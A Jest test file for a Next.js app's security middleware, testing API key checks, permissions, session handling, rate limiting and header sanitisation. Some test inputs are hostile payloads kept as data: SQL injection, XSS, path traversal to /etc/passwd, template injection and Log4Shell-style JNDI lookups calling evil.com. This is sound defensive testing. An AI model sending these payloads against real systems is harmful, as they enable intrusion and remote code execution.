/**
 * Authentication and Authorization Security Tests
 * Tests for authentication mechanisms, authorization controls, and session management
 */

import { NextRequest } from 'next/server';
import { withSecurity, createSecureAPIHandler } from '@/lib/security/security-middleware';
import { apiKeyManager } from '@/lib/security/api-key-manager';
import { auditLogger } from '@/lib/security/audit-logger';
import { aiSecurityManager } from '@/lib/ai/services/security';

// Mock dependencies
jest.mock('@/lib/security/audit-logger', () => ({
  auditLogger: {
    logAPIAccess: jest.fn(() => Promise.resolve()),
    logSecurityViolation: jest.fn(() => Promise.resolve()),
    logAIOperation: jest.fn(() => Promise.resolve())
  }
}));

jest.mock('@/lib/security/cost-tracker', () => ({
  costTracker: {
    isWithinBudget: jest.fn(() => ({ withinBudget: true, budgets: [] }))
  }
}));

jest.mock('@/lib/security/rate-limiter', () => ({
  rateLimiters: {
    aiOperations: {
      checkLimit: jest.fn(() => ({ allowed: true, remaining: 100, resetTime: Date.now() + 3600000 }))
    },
    research: {
      checkLimit: jest.fn(() => ({ allowed: true, remaining: 50, resetTime: Date.now() + 3600000 }))
    },
    enrichment: {
      checkLimit: jest.fn(() => ({ allowed: true, remaining: 50, resetTime: Date.now() + 3600000 }))
    },
    duplicateDetection: {
      checkLimit: jest.fn(() => ({ allowed: true, remaining: 50, resetTime: Date.now() + 3600000 }))
    },
    admin: {
      checkLimit: jest.fn(() => ({ allowed: true, remaining: 1000, resetTime: Date.now() + 3600000 }))
    },
    ipBased: {
      checkLimit: jest.fn(() => ({ allowed: true, remaining: 100, resetTime: Date.now() + 3600000 }))
    }
  },
  rateLimitUtils: {
    getClientIP: jest.fn(() => '192.168.1.100'),
    formatRateLimitHeaders: jest.fn(() => ({})),
    createRateLimitError: jest.fn(() => ({ error: 'Rate limit exceeded' }))
  }
}));

describe('Authentication and Authorization Security Tests', () => {
  beforeEach(() => {
    jest.clearAllMocks();
  });

  describe('API Key Authentication', () => {
    it('should reject requests without API key', async () => {
      const request = new NextRequest('http://localhost:3000/api/test', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({ test: 'data' })
      });

      const result = await withSecurity(request, {
        requireAPIKey: true
      });

      expect(result.response).toBeDefined();
      expect(result.response!.status).toBe(401);
      
      const data = await result.response!.json();
      expect(data.error).toContain('API key');
    });

    it('should reject requests with malformed API key', async () => {
      const request = new NextRequest('http://localhost:3000/api/test', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': 'Bearer malformed-key-'
        },
        body: JSON.stringify({ test: 'data' })
      });

      const result = await withSecurity(request, {
        requireAPIKey: true
      });

      expect(result.response).toBeDefined();
      expect(result.response!.status).toBe(401);
    });

    it('should validate API key format and structure', async () => {
      const invalidKeys = [
        '',
        'short',
        'no-bearer-format',
        'Bearer',
        'Bearer ',
        'bearer abc123', // lowercase
        'API-Key abc123', // wrong scheme
        'Bearer abc123\x00', // null byte
        'Bearer ' + 'a'.repeat(1000) // too long
      ];

      for (const key of invalidKeys) {
        const request = new NextRequest('http://localhost:3000/api/test', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            'Authorization': key
          },
          body: JSON.stringify({ test: 'data' })
        });

        const result = await withSecurity(request, {
          requireAPIKey: true
        });

        expect(result.response?.status).toBe(401);
      }
    });

    it('should handle API key extraction from various header formats', async () => {
      const validFormats = [
        'Bearer abc123def456',
        'bearer abc123def456', // Should be case insensitive
        'Bearer    abc123def456', // Multiple spaces
        'Bearer\tabc123def456', // Tab
        'Bearer abc123def456 ', // Trailing space
        'Bearer abc123def456\r\n' // Newline
      ];

      // Mock successful validation for testing
      jest.spyOn(apiKeyManager, 'validateAPIKey').mockResolvedValue({
        valid: true,
        key: {
          id: 'test-key-id',
          userId: 'test-user-id',
          permissions: ['read', 'write'],
          isActive: true
        }
      });

      for (const authHeader of validFormats) {
        const request = new NextRequest('http://localhost:3000/api/test', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            'Authorization': authHeader
          },
          body: JSON.stringify({ test: 'data' })
        });

        const result = await withSecurity(request, {
          requireAPIKey: true
        });

        // Should not reject based on format (actual validation depends on key manager)
        if (result.response) {
          expect(result.response.status).not.toBe(401);
        }
      }
    });
  });

  describe('Authorization and Permission Checks', () => {
    beforeEach(() => {
      // Mock successful API key validation
      jest.spyOn(apiKeyManager, 'validateAPIKey').mockResolvedValue({
        valid: true,
        key: {
          id: 'test-key-id',
          userId: 'test-user-id',
          permissions: ['read', 'search'],
          isActive: true
        }
      });
    });

    it('should allow access with sufficient permissions', async () => {
      const request = new NextRequest('http://localhost:3000/api/test', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': 'Bearer valid-key'
        },
        body: JSON.stringify({ test: 'data' })
      });

      const result = await withSecurity(request, {
        requireAPIKey: true,
        requiredPermission: 'read'
      });

      expect(result.response).toBeUndefined();
      expect(result.context.permissions).toContain('read');
    });

    it('should deny access with insufficient permissions', async () => {
      const request = new NextRequest('http://localhost:3000/api/test', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': 'Bearer valid-key'
        },
        body: JSON.stringify({ test: 'data' })
      });

      const result = await withSecurity(request, {
        requireAPIKey: true,
        requiredPermission: 'admin'
      });

      expect(result.response).toBeDefined();
      expect(result.response!.status).toBe(403);
      
      const data = await result.response!.json();
      expect(data.error).toContain('Insufficient permissions');
    });

    it('should handle wildcard permissions correctly', async () => {
      // Mock API key with wildcard permission
      jest.spyOn(apiKeyManager, 'validateAPIKey').mockResolvedValue({
        valid: true,
        key: {
          id: 'test-key-id',
          userId: 'test-user-id',
          permissions: ['*'],
          isActive: true
        }
      });

      const request = new NextRequest('http://localhost:3000/api/test', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': 'Bearer wildcard-key'
        },
        body: JSON.stringify({ test: 'data' })
      });

      const result = await withSecurity(request, {
        requireAPIKey: true,
        requiredPermission: 'any-operation'
      });

      expect(result.response).toBeUndefined();
      expect(result.context.permissions).toContain('*');
    });

    it('should validate permission format and prevent injection', async () => {
      const maliciousPermissions = [
        'admin; DROP TABLE users; --',
        'admin\x00admin',
        'admin<script>alert("xss")</script>',
        '../../../etc/passwd',
        '${jndi:ldap://evil.com/a}',
        '{{7*7}}',
        '<%=7*7%>'
      ];

      for (const permission of maliciousPermissions) {
        const request = new NextRequest('http://localhost:3000/api/test', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            'Authorization': 'Bearer valid-key'
          },
          body: JSON.stringify({ test: 'data' })
        });

        const result = await withSecurity(request, {
          requireAPIKey: true,
          requiredPermission: permission
        });

        // Should either reject or sanitize the permission
        if (result.response) {
          expect(result.response.status).toBeGreaterThanOrEqual(400);
        }
      }
    });
  });

  describe('Session Management Security', () => {
    it('should handle session timeout correctly', async () => {
      // Mock expired API key
      jest.spyOn(apiKeyManager, 'validateAPIKey').mockResolvedValue({
        valid: true,
        key: {
          id: 'expired-key-id',
          userId: 'test-user-id',
          permissions: ['read'],
          isActive: true,
          expiresAt: new Date(Date.now() - 86400000) // Expired yesterday
        }
      });

      const request = new NextRequest('http://localhost:3000/api/test', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': 'Bearer expired-key'
        },
        body: JSON.stringify({ test: 'data' })
      });

      const result = await withSecurity(request, {
        requireAPIKey: true
      });

      expect(result.response).toBeDefined();
      expect(result.response!.status).toBe(401);
    });

    it('should detect and prevent session hijacking', async () => {
      const suspiciousRequests = [
        {
          headers: {
            'Authorization': 'Bearer valid-key',
            'X-Forwarded-For': '192.168.1.100, 10.0.0.1',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
          },
          description: 'Multiple IP addresses in chain'
        },
        {
          headers: {
            'Authorization': 'Bearer valid-key',
            'X-Real-IP': '169.254.169.254', // AWS metadata IP
            'User-Agent': 'curl/7.68.0'
          },
          description: 'Suspicious IP address'
        },
        {
          headers: {
            'Authorization': 'Bearer valid-key',
            'User-Agent': 'Mozilla/5.0 (compatible; bot/1.0)'
          },
          description: 'Bot user agent'
        }
      ];

      for (const { headers, description } of suspiciousRequests) {
        const request = new NextRequest('http://localhost:3000/api/test', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            ...headers
          },
          body: JSON.stringify({ test: 'data' })
        });

        const result = await withSecurity(request, {
          requireAPIKey: true
        });

        // Log the suspicious activity
        expect(auditLogger.logSecurityViolation).toHaveBeenCalled();
      }
    });

    it('should handle concurrent session limits', async () => {
      // Mock API key that's already in use
      jest.spyOn(apiKeyManager, 'validateAPIKey').mockResolvedValue({
        valid: true,
        key: {
          id: 'concurrent-key-id',
          userId: 'test-user-id',
          permissions: ['read'],
          isActive: true,
          lastUsed: new Date(Date.now() - 1000) // Recently used
        }
      });

      const concurrentRequests = Array(10).fill(null).map(() =>
        new NextRequest('http://localhost:3000/api/test', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            'Authorization': 'Bearer concurrent-key'
          },
          body: JSON.stringify({ test: 'data' })
        })
      );

      const results = await Promise.all(concurrentRequests.map(req => withSecurity(req, {
        requireAPIKey: true
      })));

      // Some requests might be rate limited or rejected due to concurrent usage
      const rejectedRequests = results.filter(r => r.response);
      expect(rejectedRequests.length).toBeGreaterThanOrEqual(0);
    });
  });

  describe('Rate Limiting Security', () => {
    it('should enforce rate limits per API key', async () => {
      // Mock rate limit exhaustion
      const { rateLimiters } = require('@/lib/security/rate-limiter');
      rateLimiters.aiOperations.checkLimit
        .mockReturnValueOnce({ allowed: true, remaining: 1, resetTime: Date.now() + 3600000 })
        .mockReturnValueOnce({ allowed: false, remaining: 0, resetTime: Date.now() + 3600000 });

      const requests = [
        new NextRequest('http://localhost:3000/api/test', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            'Authorization': 'Bearer rate-limited-key'
          },
          body: JSON.stringify({ test: 'data1' })
        }),
        new NextRequest('http://localhost:3000/api/test', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            'Authorization': 'Bearer rate-limited-key'
          },
          body: JSON.stringify({ test: 'data2' })
        })
      ];

      const [firstResult, secondResult] = await Promise.all(requests.map(req => 
        withSecurity(req, { requireAPIKey: true })
      ));

      expect(firstResult.response).toBeUndefined();
      expect(secondResult.response).toBeDefined();
      expect(secondResult.response!.status).toBe(429);
    });

    it('should implement progressive rate limiting', async () => {
      const { rateLimiters } = require('@/lib/security/rate-limiter');
      
      // Simulate increasing rate limit restrictions
      rateLimiters.aiOperations.checkLimit
        .mockReturnValueOnce({ allowed: true, remaining: 10, resetTime: Date.now() + 3600000 })
        .mockReturnValueOnce({ allowed: true, remaining: 5, resetTime: Date.now() + 3600000 })
        .mockReturnValueOnce({ allowed: true, remaining: 1, resetTime: Date.now() + 3600000 })
        .mockReturnValueOnce({ allowed: false, remaining: 0, resetTime: Date.now() + 7200000 }); // Longer timeout

      const requests = Array(4).fill(null).map((_, i) =>
        new NextRequest('http://localhost:3000/api/test', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            'Authorization': 'Bearer progressive-key'
          },
          body: JSON.stringify({ test: `data${i}` })
        })
      );

      const results = await Promise.all(requests.map(req => 
        withSecurity(req, { requireAPIKey: true })
      ));

      expect(results[0].response).toBeUndefined();
      expect(results[1].response).toBeUndefined();
      expect(results[2].response).toBeUndefined();
      expect(results[3].response).toBeDefined();
      expect(results[3].response!.status).toBe(429);
    });

    it('should handle rate limit bypass attempts', async () => {
      const bypassAttempts = [
        { headers: { 'X-Forwarded-For': '1.2.3.4' }, description: 'IP spoofing' },
        { headers: { 'X-Real-IP': '5.6.7.8' }, description: 'Alternative IP header' },
        { headers: { 'X-Originating-IP': '9.10.11.12' }, description: 'Originating IP' },
        { headers: { 'User-Agent': 'Different-Agent/1.0' }, description: 'User agent change' }
      ];

      for (const { headers, description } of bypassAttempts) {
        const request = new NextRequest('http://localhost:3000/api/test', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            'Authorization': 'Bearer bypass-key',
            ...headers
          },
          body: JSON.stringify({ test: 'data' })
        });

        const result = await withSecurity(request, {
          requireAPIKey: true
        });

        // Should log suspicious bypass attempts
        if (description.includes('spoofing') || description.includes('bypass')) {
          expect(auditLogger.logSecurityViolation).toHaveBeenCalled();
        }
      }
    });
  });

  describe('Cross-Origin Request Security', () => {
    it('should validate CORS headers', async () => {
      const corsRequests = [
        {
          headers: { 'Origin': 'https://evil.com' },
          expected: 'should be rejected or validated'
        },
        {
          headers: { 'Origin': 'null' },
          expected: 'should be rejected'
        },
        {
          headers: { 'Origin': 'file://' },
          expected: 'should be rejected'
        },
        {
          headers: { 'Origin': 'https://localhost:3000' },
          expected: 'should be allowed for development'
        }
      ];

      for (const { headers, expected } of corsRequests) {
        const request = new NextRequest('http://localhost:3000/api/test', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            'Authorization': 'Bearer cors-key',
            ...headers
          },
          body: JSON.stringify({ test: 'data' })
        });

        const result = await withSecurity(request, {
          requireAPIKey: true
        });

        // CORS validation would typically be handled by middleware
        // This test ensures the security context captures origin information
        expect(result.context.ip).toBeDefined();
      }
    });

    it('should handle preflight requests securely', async () => {
      const preflightRequest = new NextRequest('http://localhost:3000/api/test', {
        method: 'OPTIONS',
        headers: {
          'Origin': 'https://example.com',
          'Access-Control-Request-Method': 'POST',
          'Access-Control-Request-Headers': 'Authorization, Content-Type'
        }
      });

      const result = await withSecurity(preflightRequest, {
        requireAPIKey: true
      });

      // Preflight requests should be handled appropriately
      expect(result.context.ip).toBeDefined();
    });
  });

  describe('Security Headers and Context', () => {
    it('should extract and validate client IP securely', async () => {
      const ipHeaders = [
        { 'X-Forwarded-For': '192.168.1.100, 10.0.0.1' },
        { 'X-Real-IP': '192.168.1.101' },
        { 'CF-Connecting-IP': '192.168.1.102' },
        { 'X-Client-IP': '192.168.1.103' },
        {} // No IP headers
      ];

      for (const headers of ipHeaders) {
        const request = new NextRequest('http://localhost:3000/api/test', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            'Authorization': 'Bearer ip-test-key',
            ...headers
          },
          body: JSON.stringify({ test: 'data' })
        });

        const result = await withSecurity(request, {
          requireAPIKey: true
        });

        expect(result.context.ip).toBeDefined();
        expect(result.context.ip).toMatch(/^\d+\.\d+\.\d+\.\d+$/);
      }
    });

    it('should sanitize and validate user agent', async () => {
      const maliciousUserAgents = [
        '../../../etc/passwd',
        '<script>alert("xss")</script>',
        'Mozilla/5.0\x00(injection)',
        'User-Agent: ${jndi:ldap://evil.com/}',
        'Mozilla/5.0 (compatible; bot/1.0; +http://evil.com/bot)'
      ];

      for (const userAgent of maliciousUserAgents) {
        const request = new NextRequest('http://localhost:3000/api/test', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            'Authorization': 'Bearer ua-test-key',
            'User-Agent': userAgent
          },
          body: JSON.stringify({ test: 'data' })
        });

        const result = await withSecurity(request, {
          requireAPIKey: true
        });

        expect(result.context.userAgent).toBeDefined();
        // User agent should be sanitized or the request flagged
        if (userAgent.includes('<script>') || userAgent.includes('../')) {
          expect(auditLogger.logSecurityViolation).toHaveBeenCalled();
        }
      }
    });
  });

  describe('Secure API Handler Integration', () => {
    it('should create secure API handler with proper error handling', async () => {
      const secureHandler = createSecureAPIHandler(
        async (request, context) => {
          return new Response(JSON.stringify({ success: true, userId: context.userId }));
        },
        {
          requireAPIKey: true,
          requiredPermission: 'read'
        }
      );

      // Mock successful validation
      jest.spyOn(apiKeyManager, 'validateAPIKey').mockResolvedValue({
        valid: true,
        key: {
          id: 'test-key-id',
          userId: 'test-user-id',
          permissions: ['read'],
          isActive: true
        }
      });

      const request = new NextRequest('http://localhost:3000/api/secure-test', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': 'Bearer valid-key'
        },
        body: JSON.stringify({ test: 'data' })
      });

      const response = await secureHandler(request);
      const data = await response.json();

      expect(data.success).toBe(true);
      expect(data.userId).toBe('test-user-id');
    });

    it('should handle handler errors securely', async () => {
      const secureHandler = createSecureAPIHandler(
        async () => {
          throw new Error('Internal error');
        },
        { requireAPIKey: true }
      );

      jest.spyOn(apiKeyManager, 'validateAPIKey').mockResolvedValue({
        valid: true,
        key: {
          id: 'test-key-id',
          userId: 'test-user-id',
          permissions: ['read'],
          isActive: true
        }
      });

      const request = new NextRequest('http://localhost:3000/api/error-test', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': 'Bearer valid-key'
        },
        body: JSON.stringify({ test: 'data' })
      });

      const response = await secureHandler(request);
      const data = await response.json();

      expect(response.status).toBe(500);
      expect(data.error).toBe('Internal server error');
      expect(data.stack).toBeUndefined(); // Stack trace should not be exposed
    });
  });
});